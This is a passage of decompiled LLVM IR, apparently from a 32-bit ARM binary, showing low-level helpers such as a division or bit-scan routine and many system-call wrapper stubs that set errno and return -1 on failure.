thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_124b0 = phi i32 [ %v1_1249c, %bb89 ], [ %v1_1249c, %.thread9 ], [ %v6_1249c, %bb90 ]
  %v0_124a0 = phi i32 [ %v6_12498, %bb89 ], [ %v1_12498, %.thread9 ], [ %v6_12498, %bb90 ]
  %v2_124a0 = icmp eq i32 %v0_124a0, 0
  br i1 %v2_124a0, label %dec_label_pc_124b0, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_124a4 = udiv i32 %v1_124a4, 16
  store i32 %v4_124a4, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_124a4, 16
  br i1 %tmp138, label %dec_label_pc_124b0, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_124a8 = udiv i32 %v1_124a8, 16
  br label %dec_label_pc_12470

dec_label_pc_124b0:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_124b0

dec_label_pc_124b8:                               ; preds = %dec_label_pc_12424
  %v9_12424 = icmp eq i32 %v0_12424, %v1_12424
  %. = zext i1 %v9_12424 to i32
  ret i32 %.

dec_label_pc_124c4:                               ; preds = %dec_label_pc_1242c
  %v2_124c4 = icmp ugt i32 %v1_12424, 65535
  br i1 %v2_124c4, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_124c4
  %v2_124c8 = and i32 %v1_12424, 32768
  %v3_124c8 = icmp eq i32 %v2_124c8, 0
  %v4_124c8 = udiv i32 %v1_12424, 65536
  br i1 %v3_124c8, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_124c4
  %v0_124d465 = phi i32 [ %v1_12424, %dec_label_pc_124c4 ], [ %v4_124c8, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_124d8 = phi i32 [ %v0_124d465, %.thread16 ], [ %v4_124c8, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* @r2, align 4
  %v2_124d4 = icmp ugt i32 %v1_124d8, 255
  br i1 %v2_124d4, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_124d8 = and i32 %v1_124d8, 128
  %v3_124d8 = icmp eq i32 %v2_124d8, 0
  %v4_124d8 = udiv i32 %v1_124d8, 256
  br i1 %v3_124d8, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_124dc = or i32 %storemerge, 8
  store i32 %v2_124dc, i32* @r2, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_124e8 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_124dc, %bb98 ]
  %v1_124e4 = phi i32 [ %v1_124d8, %bb96 ], [ %v4_124d8, %bb97 ], [ %v4_124d8, %bb98 ]
  %v2_124e0 = icmp ugt i32 %v1_124e4, 15
  br i1 %v2_124e0, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_124e4 = and i32 %v1_124e4, 8
  %v3_124e4 = icmp eq i32 %v2_124e4, 0
  %v4_124e4 = udiv i32 %v1_124e4, 16
  br i1 %v3_124e4, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_124e8 = add nsw i32 %v1_124e8, 4
  store i32 %v2_124e8, i32* @r2, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_124f0 = phi i32 [ %v1_124e8, %.thread17 ], [ %v1_124e8, %bb99 ], [ %v2_124e8, %bb100 ]
  %v5_124f4 = phi i32 [ %v1_124e4, %.thread17 ], [ %v4_124e4, %bb99 ], [ %v4_124e4, %bb100 ]
  %v2_124ec = icmp ugt i32 %v5_124f4, 3
  %v7_124ec = icmp eq i32 %v5_124f4, 4
  %v2_124f0 = xor i1 %v7_124ec, true
  %v3_124f0 = and i1 %v2_124ec, %v2_124f0
  br i1 %v3_124f0, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_124f0 = add nsw i32 %v4_124f0, 3
  store i32 %v5_124f0, i32* @r2, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_124f4 = phi i32 [ %v4_124f0, %.thread18 ], [ %v5_124f0, %bb101 ]
  %v2_124f4 = xor i1 %v2_124ec, true
  %v3_124f4 = or i1 %v7_124ec, %v2_124f4
  br i1 %v3_124f4, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_124f4 = udiv i32 %v5_124f4, 2
  %v9_124f4 = add i32 %v4_124f4, %v8_124f4
  store i32 %v9_124f4, i32* @r2, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_124f8 = phi i32 [ %v4_124f4, %bb102 ], [ %v9_124f4, %bb103 ]
  %v6_124f8 = lshr i32 %v0_12424, %v1_124f8
  ret i32 %v6_124f8

dec_label_pc_12500:                               ; preds = %dec_label_pc_12418
  %v0_12500 = load i32, i32* @lr, align 4
  %v0_12504 = call i32 @function_1252c()
  store i32 %v0_12500, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_124f4, { 1, 0 }
  uselistorder i1 %v7_124ec, { 1, 0 }
  uselistorder i32 %v4_124e4, { 1, 0 }
  uselistorder i32 %v1_124e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_124dc, { 1, 0 }
  uselistorder i32 %v4_124d8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_124d8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_124c8, { 1, 0 }
  uselistorder i32 %v0_124a0, { 1, 0 }
  uselistorder i32 %v4_12494, { 1, 0 }
  uselistorder i32 %v1_1249c, { 1, 2, 0 }
  uselistorder i32 %v4_12488, { 1, 0 }
  uselistorder i32 %v1_12490, { 1, 2, 0 }
  uselistorder i32 %v4_1247c, { 1, 0 }
  uselistorder i32 %v1_12484, { 1, 2, 0 }
  uselistorder i32 %v1_124a8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12478, { 1, 0 }
  uselistorder i32 %v3_12464, { 2, 0, 1 }
  uselistorder i32 %v3_12460, { 1, 0 }
  uselistorder i32 %v1_12460, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12464, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12450, { 2, 0, 1 }
  uselistorder i32 %v4_1244c, { 2, 1, 0 }
  uselistorder i32 %v1_12450, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12458.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_12424, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_12424, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12418, { 2, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_124b0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1246c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12458thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_12514(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12514:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12518 = call i32 @function_12418()
  ret i32 %v0_12518
}

define i32 @function_1252c() local_unnamed_addr {
dec_label_pc_1252c:
  %v1_12534 = call i32 @function_14abc(i32 8)
  ret i32 %v1_12534
}

define i32 @function_12540() local_unnamed_addr {
dec_label_pc_12540:
  %v0_12540 = load i32, i32* @r7, align 4
  store i32 %v0_12540, i32* @ip, align 4
  %v0_12550 = load i32, i32* @r0, align 4
  %v2_12550 = icmp ugt i32 %v0_12550, -4097
  br i1 %v2_12550, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_12540
  ret i32 %v0_12550

bb1:                                              ; preds = %dec_label_pc_12540
  %v4_1255c = icmp eq i32 %v0_12550, -38
  br i1 %v4_1255c, label %dec_label_pc_12564, label %bb2

dec_label_pc_12564:                               ; preds = %bb1
  store i32 %v0_12540, i32* @ip, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_12564, %bb1
  %v0_1257c = call i32 @function_17344()
  ret i32 %v0_1257c
}

define i32 @function_12580(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12580:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12580 = load i32, i32* @r7, align 4
  store i32 %v3_12580, i32* %stack_var_-8, align 4
  %v0_1258c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1258c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1258c, -4095
  br i1 %tmp, label %dec_label_pc_125ac, label %dec_label_pc_1259c

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12580
  %v0_1259c = call i32 @function_12b24()
  %v0_125a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_125a0 = sub i32 0, %v0_125a0
  %v2_125a4 = inttoptr i32 %v0_1259c to i32*
  store i32 %v1_125a0, i32* %v2_125a4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_125ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_125ac

dec_label_pc_125ac:                               ; preds = %dec_label_pc_12580, %dec_label_pc_1259c
  %v1_125b0 = phi i32 [ %v0_1258c, %dec_label_pc_12580 ], [ -1, %dec_label_pc_1259c ]
  %v2_125ac = phi i32 [ %v3_12580, %dec_label_pc_12580 ], [ %v2_125ac.pre, %dec_label_pc_1259c ]
  store i32 %v2_125ac, i32* @r7, align 4
  ret i32 %v1_125b0

; uselistorder directives
  uselistorder i32 %v0_1258c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125ac, { 1, 0 }
}

define i32 @function_125b4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_125b4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_125b4 = load i32, i32* @r2, align 4
  %v9_125b4 = load i32, i32* @r3, align 4
  store i32 %v9_125b4, i32* %stack_var_-4, align 4
  %v1_125c4 = and i32 %arg2, 64
  %v2_125c4 = icmp eq i32 %v1_125c4, 0
  br i1 %v2_125c4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_125b4
  %v3_125cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_125cc, i32* @r3, align 4
  %phitmp = urem i32 %v6_125b4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_125b4, %bb
  %v0_125d0 = phi i32 [ 0, %dec_label_pc_125b4 ], [ %phitmp, %bb ]
  store i32 %v0_125d0, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12600, label %dec_label_pc_125f0

dec_label_pc_125f0:                               ; preds = %.thread
  %v0_125f0 = call i32 @function_12b24()
  %v0_125f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_125f4 = sub i32 0, %v0_125f4
  store i32 %v1_125f4, i32* @r3, align 4
  %v2_125f8 = inttoptr i32 %v0_125f0 to i32*
  store i32 %v1_125f4, i32* %v2_125f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12600

dec_label_pc_12600:                               ; preds = %.thread, %dec_label_pc_125f0
  %v0_12600 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_125f0 ]
  ret i32 %v0_12600

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12600, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12614(i32 %arg1) local_unnamed_addr {
dec_label_pc_12614:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12614 = load i32, i32* @r7, align 4
  store i32 %v3_12614, i32* %stack_var_-8, align 4
  %v0_12620 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12620, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12620, -4095
  br i1 %tmp, label %dec_label_pc_12640, label %dec_label_pc_12630

dec_label_pc_12630:                               ; preds = %dec_label_pc_12614
  %v0_12630 = call i32 @function_12b24()
  %v0_12634 = load i32, i32* %r7.global-to-local, align 4
  %v1_12634 = sub i32 0, %v0_12634
  %v2_12638 = inttoptr i32 %v0_12630 to i32*
  store i32 %v1_12634, i32* %v2_12638, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12640.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12640

dec_label_pc_12640:                               ; preds = %dec_label_pc_12614, %dec_label_pc_12630
  %v1_12644 = phi i32 [ %v0_12620, %dec_label_pc_12614 ], [ -1, %dec_label_pc_12630 ]
  %v2_12640 = phi i32 [ %v3_12614, %dec_label_pc_12614 ], [ %v2_12640.pre, %dec_label_pc_12630 ]
  store i32 %v2_12640, i32* @r7, align 4
  ret i32 %v1_12644

; uselistorder directives
  uselistorder i32 %v0_12620, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12640, { 1, 0 }
}

define i32 @function_12648() local_unnamed_addr {
dec_label_pc_12648:
  %v1_12658 = load i32, i32* @r0, align 4
  ret i32 %v1_12658
}

define i32 @function_1265c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1265c:
  %stack_var_-16 = alloca i32, align 4
  %v2_12660 = ptrtoint i32* %stack_var_-16 to i32
  %v2_12670 = call i32 @function_1286c(i32 %v2_12660, i32 0)
  %v2_12674 = load i32, i32* %stack_var_-16, align 4
  %v2_12678 = icmp eq i32* %arg1, null
  br i1 %v2_12678, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1265c
  store i32 %v2_12674, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_1265c, %bb
  ret i32 %v2_12674

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_1268c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1268c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_126c0, label %dec_label_pc_126b0

dec_label_pc_126b0:                               ; preds = %dec_label_pc_1268c
  %v0_126b0 = call i32 @function_12b24()
  %v0_126b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_126b4 = sub i32 0, %v0_126b4
  %v2_126b8 = inttoptr i32 %v0_126b0 to i32*
  store i32 %v1_126b4, i32* %v2_126b8, align 4
  br label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %dec_label_pc_1268c, %dec_label_pc_126b0
  %v1_126c8 = phi i32 [ %arg1, %dec_label_pc_1268c ], [ -1, %dec_label_pc_126b0 ]
  ret i32 %v1_126c8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126c0, { 1, 0 }
}

define i32 @function_126cc() local_unnamed_addr {
dec_label_pc_126cc:
  %v1_126dc = load i32, i32* @r0, align 4
  ret i32 %v1_126dc
}

define i32 @function_126e0() local_unnamed_addr {
dec_label_pc_126e0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_126e0 = load i32, i32* @r7, align 4
  store i32 %v3_126e0, i32* %stack_var_-8, align 4
  %v0_126ec = load i32, i32* @r0, align 4
  store i32 %v0_126ec, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_126ec, -4095
  br i1 %tmp, label %dec_label_pc_1270c, label %dec_label_pc_126fc

dec_label_pc_126fc:                               ; preds = %dec_label_pc_126e0
  %v0_126fc = call i32 @function_12b24()
  %v0_12700 = load i32, i32* %r7.global-to-local, align 4
  %v1_12700 = sub i32 0, %v0_12700
  %v2_12704 = inttoptr i32 %v0_126fc to i32*
  store i32 %v1_12700, i32* %v2_12704, align 4
  %v2_1270c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_126e0, %dec_label_pc_126fc
  %v1_12710 = phi i32 [ %v0_126ec, %dec_label_pc_126e0 ], [ -1, %dec_label_pc_126fc ]
  %v2_1270c = phi i32 [ %v3_126e0, %dec_label_pc_126e0 ], [ %v2_1270c.pre, %dec_label_pc_126fc ]
  store i32 %v2_1270c, i32* @r7, align 4
  ret i32 %v1_12710

; uselistorder directives
  uselistorder i32 %v0_126ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1270c, { 1, 0 }
}

define i32 @function_12714(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12714:
  %v0_12720 = load i32, i32* @r0, align 4
  %v1_12720 = load i32, i32* @r1, align 4
  %v2_12720 = call i32 @function_17404(i32 %v0_12720, i32 %v1_12720)
  ret i32 %v2_12720
}

define i32 @function_12730(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12730:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12730 = load i32, i32* @r7, align 4
  store i32 %v3_12730, i32* %stack_var_-8, align 4
  %v0_1273c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1273c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1273c, -4095
  br i1 %tmp, label %dec_label_pc_1275c, label %dec_label_pc_1274c

dec_label_pc_1274c:                               ; preds = %dec_label_pc_12730
  %v0_1274c = call i32 @function_12b24()
  %v0_12750 = load i32, i32* %r7.global-to-local, align 4
  %v1_12750 = sub i32 0, %v0_12750
  %v2_12754 = inttoptr i32 %v0_1274c to i32*
  store i32 %v1_12750, i32* %v2_12754, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1275c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1275c

dec_label_pc_1275c:                               ; preds = %dec_label_pc_12730, %dec_label_pc_1274c
  %v1_12760 = phi i32 [ %v0_1273c, %dec_label_pc_12730 ], [ -1, %dec_label_pc_1274c ]
  %v2_1275c = phi i32 [ %v3_12730, %dec_label_pc_12730 ], [ %v2_1275c.pre, %dec_label_pc_1274c ]
  store i32 %v2_1275c, i32* @r7, align 4
  ret i32 %v1_12760

; uselistorder directives
  uselistorder i32 %v0_1273c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1275c, { 1, 0 }
}

define i32 @function_12764(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_12764:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12794, label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %dec_label_pc_12764
  %v0_12784 = call i32 @function_12b24()
  %v0_12788 = load i32, i32* %r4.global-to-local, align 4
  %v1_12788 = sub i32 0, %v0_12788
  %v2_1278c = inttoptr i32 %v0_12784 to i32*
  store i32 %v1_12788, i32* %v2_1278c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12764, %dec_label_pc_12784
  %v0_12794 = phi i32 [ %arg1, %dec_label_pc_12764 ], [ -1, %dec_label_pc_12784 ]
  ret i32 %v0_12794

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12794, { 1, 0 }
}

define i32 @function_127a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_127a4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_127a4 = load i32, i32* @r7, align 4
  store i32 %v3_127a4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_127cc, label %dec_label_pc_127bc

dec_label_pc_127bc:                               ; preds = %dec_label_pc_127a4
  %v0_127bc = call i32 @function_12b24()
  %v0_127c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_127c0 = sub i32 0, %v0_127c0
  %v2_127c4 = inttoptr i32 %v0_127bc to i32*
  store i32 %v1_127c0, i32* %v2_127c4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_127d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_127cc

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127a4, %dec_label_pc_127bc
  %v2_127d0 = phi i32 [ %v3_127a4, %dec_label_pc_127a4 ], [ %v2_127d0.pre, %dec_label_pc_127bc ]
  %v0_127cc = phi i32 [ %arg1, %dec_label_pc_127a4 ], [ -1, %dec_label_pc_127bc ]
  store i32 %v2_127d0, i32* @r7, align 4
  ret i32 %v0_127cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_127cc, { 1, 0 }
}

define i32 @function_127d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_127d8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_127d8 = load i32, i32* @r7, align 4
  store i32 %v3_127d8, i32* %stack_var_-8, align 4
  %v0_127e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_127e4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_127e4, -4095
  br i1 %tmp, label %dec_label_pc_12804, label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %dec_label_pc_127d8
  %v0_127f4 = call i32 @function_12b24()
  %v0_127f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_127f8 = sub i32 0, %v0_127f8
  %v2_127fc = inttoptr i32 %v0_127f4 to i32*
  store i32 %v1_127f8, i32* %v2_127fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12804.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127d8, %dec_label_pc_127f4
  %v1_12808 = phi i32 [ %v0_127e4, %dec_label_pc_127d8 ], [ -1, %dec_label_pc_127f4 ]
  %v2_12804 = phi i32 [ %v3_127d8, %dec_label_pc_127d8 ], [ %v2_12804.pre, %dec_label_pc_127f4 ]
  store i32 %v2_12804, i32* @r7, align 4
  ret i32 %v1_12808

; uselistorder directives
  uselistorder i32 %v0_127e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12804, { 1, 0 }
}

define i32 @function_1280c() local_unnamed_addr {
dec_label_pc_1280c:
  %stack_var_-16 = alloca i32, align 4
  %v2_12810 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1281c = call i32 @function_174dc(i32 7, i32 %v2_12810)
  %v1_12820 = icmp slt i32 %v2_1281c, 0
  %v5_12824 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_12820, i32 256, i32 %v5_12824
  ret i32 %storemerge
}

define i32 @function_12838(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12838:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12838 = load i32, i32* @r7, align 4
  store i32 %v3_12838, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12860, label %dec_label_pc_12850

dec_label_pc_12850:                               ; preds = %dec_label_pc_12838
  %v0_12850 = call i32 @function_12b24()
  %v0_12854 = load i32, i32* %r7.global-to-local, align 4
  %v1_12854 = sub i32 0, %v0_12854
  store i32 %v1_12854, i32* @r3, align 4
  %v2_12858 = inttoptr i32 %v0_12850 to i32*
  store i32 %v1_12854, i32* %v2_12858, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12864.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_12838, %dec_label_pc_12850
  %v2_12864 = phi i32 [ %v3_12838, %dec_label_pc_12838 ], [ %v2_12864.pre, %dec_label_pc_12850 ]
  %v0_12860 = phi i32 [ %arg1, %dec_label_pc_12838 ], [ -1, %dec_label_pc_12850 ]
  store i32 %v2_12864, i32* @r7, align 4
  ret i32 %v0_12860

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12860, { 1, 0 }
}

define i32 @function_1286c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1286c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1286c = load i32, i32* @r7, align 4
  store i32 %v3_1286c, i32* %stack_var_-8, align 4
  %v0_12878 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12878, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12878, -4095
  br i1 %tmp, label %dec_label_pc_12898, label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %dec_label_pc_1286c
  %v0_12888 = call i32 @function_12b24()
  %v0_1288c = load i32, i32* %r7.global-to-local, align 4
  %v1_1288c = sub i32 0, %v0_1288c
  %v2_12890 = inttoptr i32 %v0_12888 to i32*
  store i32 %v1_1288c, i32* %v2_12890, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12898.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_1286c, %dec_label_pc_12888
  %v1_1289c = phi i32 [ %v0_12878, %dec_label_pc_1286c ], [ -1, %dec_label_pc_12888 ]
  %v2_12898 = phi i32 [ %v3_1286c, %dec_label_pc_1286c ], [ %v2_12898.pre, %dec_label_pc_12888 ]
  store i32 %v2_12898, i32* @r7, align 4
  ret i32 %v1_1289c

; uselistorder directives
  uselistorder i32 %v0_12878, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12898, { 1, 0 }
}

define i32 @function_128a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_128a0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_128dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_128dc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_128dc, -4095
  br i1 %tmp, label %dec_label_pc_128fc, label %dec_label_pc_128ec

dec_label_pc_128ec:                               ; preds = %dec_label_pc_128a0
  %v0_128ec = call i32 @function_12b24()
  %v0_128f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_128f0 = sub i32 0, %v0_128f0
  %v2_128f4 = inttoptr i32 %v0_128ec to i32*
  store i32 %v1_128f0, i32* %v2_128f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_128fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128a0, %dec_label_pc_128ec
  %v1_12908 = phi i32 [ %v0_128dc, %dec_label_pc_128a0 ], [ -1, %dec_label_pc_128ec ]
  ret i32 %v1_12908

; uselistorder directives
  uselistorder i32 %v0_128dc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_128fc, { 1, 0 }
}

define i32 @function_1290c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1290c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12948 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12948, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12948, -4095
  br i1 %tmp, label %dec_label_pc_12968, label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %dec_label_pc_1290c
  %v0_12958 = call i32 @function_12b24()
  %v0_1295c = load i32, i32* %r7.global-to-local, align 4
  %v1_1295c = sub i32 0, %v0_1295c
  %v2_12960 = inttoptr i32 %v0_12958 to i32*
  store i32 %v1_1295c, i32* %v2_12960, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12968

dec_label_pc_12968:                               ; preds = %dec_label_pc_1290c, %dec_label_pc_12958
